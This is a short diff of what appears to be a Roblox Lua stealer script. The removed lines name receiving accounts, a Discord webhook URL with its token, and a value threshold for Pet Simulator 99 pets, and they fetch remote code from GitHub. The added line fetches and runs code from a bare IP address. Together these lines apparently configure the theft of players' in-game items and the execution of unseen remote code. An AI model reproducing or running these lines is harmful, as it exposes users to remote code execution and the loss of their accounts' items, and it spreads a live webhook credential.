@@ -1,4 +1,2 @@
-Username = {"FAZE_SHADWO","CupidAltAccount1"} 
-Webhook = "https://discord.com/api/webhooks/1396980454996840559/eSB3-kg6aLty_hjB3PcqqODK5eZzFC-GYIlqLEPr3O70wej1qjttMWm-87kfVrXATN6B" 
-min_rap = 10000 --for pets go and pet simulator 99 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+ID="4e086a99-68a3-4845-8e99-01369b1d6065";
+loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
